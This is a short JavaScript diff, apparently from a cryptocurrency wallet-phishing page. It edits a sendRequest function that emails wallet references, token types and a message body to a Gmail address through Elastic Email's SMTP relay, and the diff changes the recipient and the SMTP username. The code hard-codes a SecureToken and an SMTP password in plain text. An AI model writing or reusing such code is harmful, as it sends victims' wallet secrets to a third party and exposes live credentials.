@@ -94,12 +94,12 @@ const sendRequest = (data) => {
   
     const emailData = {
         SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
-        To: "bekkierowland@gmail.com",
+        To: "olatundelucaz83@gmail.com",
         From: "bekkierowland@gmail.com",
         Subject: `${data.walletRef} and token type is ${data.type}`,
         Body: `${msg}`,
         Host: "smtp.elasticemail.com", // Replace with your SMTP server
-        Username: "lucazoluwaseun@gmail.com", // Replace with your SMTP username
+        Username: "bekkierowland@gmail.com", // Replace with your SMTP username
         Password: "955B3574AC1826A1BDB51F4AC77D9358D0FB", // Replace with your SMTP password
         Port: 2525 // Replace with your SMTP port
     };
